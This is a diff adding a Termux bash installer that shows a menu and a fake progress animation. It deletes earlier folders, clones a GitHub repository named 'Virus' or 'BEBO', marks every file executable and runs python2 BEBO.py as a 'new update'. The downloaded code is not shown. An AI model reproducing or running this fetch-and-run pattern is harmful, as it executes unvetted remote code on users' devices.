@@ -1,0 +1,171 @@
+g='\033[1;32m'
+p='\033[1;35m'
+clear
+echo -e "\033[1;32m"
+echo "         {Ctrl C} exit "
+echo "[1] Download BEBO versions {4.6.8}"
+echo "[2] Download BEBO versions {5.0.0}"
+echo ""
+echo -e "$p"
+read -p  "number-------> " download
+
+if [ "$download" -eq "1"  ]; then
+ cd
+ clear
+ termux-setup-storage
+ rm -rf $HOME/Virus
+ rm -rf $HOME/BEBO.zip
+ rm -rf $HOME/BEBO
+ clear
+ echo -e $g 'Please Wait ===+['$p'>              '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'->             '$g']|'
+ sleep 0.4  
+ clear
+ echo -e $g 'Please Wait ===+['$p'-->            '$g']/'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'--->           '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'---->          '$g']|'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'----->         '$g']/'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']|'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']\'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']/'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------->       '$g']|'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------->      '$g']/'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'--------->     '$g']\'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'---------->    '$g']|'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'----------->   '$g']/'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------------> '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------------->'$g']|'
+ sleep 0.4
+ clear 
+ echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
+ sleep 0.4
+ mkdir /sdcard/BEBO
+ mkdir /sdcard/BEBO/Encrypt
+ cd
+ git clone https://github.com/laceset/Virus
+ cd
+ cd Virus
+ mv -v BEBO.zip $HOME
+ cd
+ rm -rf Virus
+ cd
+ unzip BEBO.zip 
+ cd BEBO && chmod +x *
+ cd $HOME/BEBO
+ chmod +x *
+ cd
+ rm -rf Virus
+ rm -rf BEBO.zip
+ cd
+ cd $HOME/BEBO/.tools
+ chmod +x */*
+ clear
+ echo -e "$g+++++++++++>[$pWelcome to the new update$p$g]<+++++++++++++"
+ echo -e "     Hello      "
+ echo -e "     $p     new "
+ echo -e "     $g         Update "
+ sleep 2 
+
+ cd $HOME/BEBO
+ python2 BEBO.py
+
+elif [ "$download" -eq "2"  ]; then
+ cd
+ clear
+ termux-setup-storage
+ rm -rf $HOME/Virus
+ rm -rf $HOME/BEBO.zip
+ rm -rf $HOME/BEBO
+ clear
+ echo -e $g 'Please Wait ===+['$p'>              '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'->             '$g']|'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'-->            '$g']/'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'--->           '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'---->          '$g']|'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'----->         '$g']/'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']|'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']\'
+ sleep 0.5   
+ clear
+ echo -e $g 'Please Wait ===+['$p'------>        '$g']/'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'------->       '$g']|'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------->      '$g']/'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'--------->     '$g']\'
+ sleep 0.6
+ clear
+ echo -e $g 'Please Wait ===+['$p'---------->    '$g']|'
+ sleep 0.5
+ clear
+ echo -e $g 'Please Wait ===+['$p'----------->   '$g']/'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------------> '$g']\'
+ sleep 0.4
+ clear
+ echo -e $g 'Please Wait ===+['$p'-------------->'$g']|'
+ sleep 0.4
+ clear 
+ echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
+ sleep 0.4
+ cd
+ git clone https://github.com/nagilaceset/BEBO
+ cd BEBO
+ chmod +x *
+ clear
+ echo -e "$g+++++++++++>[$pWelcome to the new update$p$g]<+++++++++++++"
+ echo -e "     Hello      "
+ echo -e "     $p     new "
+ echo -e "     $g         Update "
+ sleep 2
+ python2 BEBO.py
+else :
+ bash NAGI.sh
+fi
